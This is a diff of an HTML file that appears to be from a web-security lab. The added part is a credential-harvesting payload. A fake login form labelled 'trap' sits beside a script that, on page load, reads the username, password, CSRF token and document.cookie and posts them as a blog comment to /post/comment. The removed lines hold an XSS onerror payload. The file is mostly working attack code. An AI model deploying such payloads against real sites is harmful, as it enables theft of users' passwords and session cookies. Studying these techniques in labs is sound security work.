@@ -1,21 +1,57 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Document</title>
-</head>
-<body>
+  </head>
+
+  <body>
+    <input type="text" name="csrf" value="csrfcall" />
+
+    <form id="trap" class="login-form" method="POST">
+      <label>Username</label>
+      <input required type="username" name="username" />
+      <label>Password</label>
+      <input required type="password" name="password" />
+      <button class="button" type="submit">Log in</button>
+    </form>
     <script>
-        function trackSearch(query) {
-                            document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
-                        }
-                        //var query = (new URLSearchParams(window.location.search)).get('search');
-                        //if(query) {
-                        //    trackSearch(query);
-                        //}
-        trackSearch('bal" onerror="alert()');
+      const loginForm = document.getElementById("trap");
+
+      loginForm.addEventListener("submit", (e) => {
+        e.preventDefault();
+      });
+      window.onload = function () {
+        const username = document.getElementsByName("username")[0].value;
+        const password = document.getElementsByName("password")[0].value;
+        const name = encodeURIComponent("victimName");
+        const email = encodeURIComponent("victim@gmail.com");
+        const website = encodeURIComponent("http://mairala.com");
+        const csrf = document.getElementsByName("csrf")[0].value;
+
+        const data = `name=victimName&email=victim@gmail.com&csrf=${csrf}&postId=5&comment=username:_${username}_password:_${password}_cookie:${document.cookie}&website=${website}`;
+        const url = "/post/comment";
+
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", url);
+
+        xhr.setRequestHeader("Accept", "application/json");
+        xhr.setRequestHeader(
+          "Content-Type",
+          "application/x-www-form-urlencoded"
+        );
+
+        xhr.onreadystatechange = function () {
+          if (xhr.readyState === 4) {
+            console.log(xhr.status);
+            console.log(xhr.responseText);
+          }
+        };
+        xhr.send(data);
+      };
+      //csrf=HdebpGWTGSkBR8Su0AtvfvApUqLyoQfz&postId=9&comment=test&name=test&email=mairala%40gmail.com&website=http%3A%2F%2Fmairala.com
     </script>
-</body>
+  </body>
 </html>
